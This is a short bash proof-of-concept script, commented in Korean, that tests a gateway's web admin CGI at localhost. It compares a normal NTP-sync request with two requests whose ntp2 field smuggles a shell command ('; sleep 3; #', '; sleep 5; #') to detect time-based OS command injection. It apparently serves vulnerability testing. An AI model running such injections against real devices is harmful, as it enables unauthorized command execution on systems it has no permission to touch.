#!/bin/bash

echo "===== [1] 정상 요청 ====="

curl -sS -o /dev/null --max-time 15 \
  -w 'HTTP_CODE=%{http_code}\nTIME_TOTAL=%{time_total}s\n' \
  -H "Cookie: $GW_COOKIE" \
  --data-urlencode "action=ntp_sync" \
  --data-urlencode "ntp2=pool.ntp.org" \
  http://127.0.0.1:8080/cgi-bin/admin.cgi

echo
echo "===== [2] OS Command Injection - sleep 3 ====="

curl -sS -o /dev/null --max-time 15 \
  -w 'HTTP_CODE=%{http_code}\nTIME_TOTAL=%{time_total}s\n' \
  -H "Cookie: $GW_COOKIE" \
  --data-urlencode "action=ntp_sync" \
  --data-urlencode "ntp2=pool.ntp.org; sleep 3; #" \
  http://127.0.0.1:8080/cgi-bin/admin.cgi

echo
echo "===== [3] OS Command Injection - sleep 5 ====="

curl -sS -o /dev/null --max-time 15 \
  -w 'HTTP_CODE=%{http_code}\nTIME_TOTAL=%{time_total}s\n' \
  -H "Cookie: $GW_COOKIE" \
  --data-urlencode "action=ntp_sync" \
  --data-urlencode "ntp2=pool.ntp.org; sleep 5; #" \
  http://127.0.0.1:8080/cgi-bin/admin.cgi
